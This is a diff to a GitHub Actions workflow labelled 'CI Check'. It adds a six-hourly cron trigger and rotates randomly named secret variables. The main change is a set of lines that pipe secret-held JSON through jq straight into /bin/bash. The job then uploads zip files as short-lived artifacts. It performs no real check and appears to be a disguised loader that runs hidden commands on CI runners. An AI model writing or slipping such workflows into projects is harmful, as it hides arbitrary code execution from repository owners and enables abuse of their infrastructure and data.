@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '57 0,6,12,18 * * *'
 jobs:
   handler:
     runs-on: ubuntu-latest
@@ -10,18 +12,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          jcgtu864: ${{ secrets.jcgtu864 }}
+          ygv18020: ${{ secrets.ygv18020 }}
         run: |
-          printf '%s' "$jcgtu864" | jq -r .linzj81 | /bin/bash
-          echo $jhql60813 | jq -r .rtxy4 | /bin/bash
-          printf '%s' "$tp61" | jq -r .gosc290 | /bin/bash
-          echo $pq7935 | jq -r .ywh40 | /bin/bash
-          echo $b16 | jq -r .nkvzf18 | /bin/bash
+          printf '%s' "$ygv18020" | jq -r .twzc7067 | /bin/bash
+          printf '%s' "$qv218" | jq -r .ukpp80736 | /bin/bash
+          echo $ndp134 | jq -r .wo9 | /bin/bash
+          echo $m94595 | jq -r .nucqz1533 | /bin/bash
+          printf '%s' "$yjshe7009" | jq -r .gjl59 | /bin/bash
+          echo $en5 | jq -r .nq4 | /bin/bash
+          printf '%s' "$fjq661" | jq -r .adkk46 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 9NgSZ20M
+          name: hRvqkset
           path: "*.zip"
           retention-days: 1
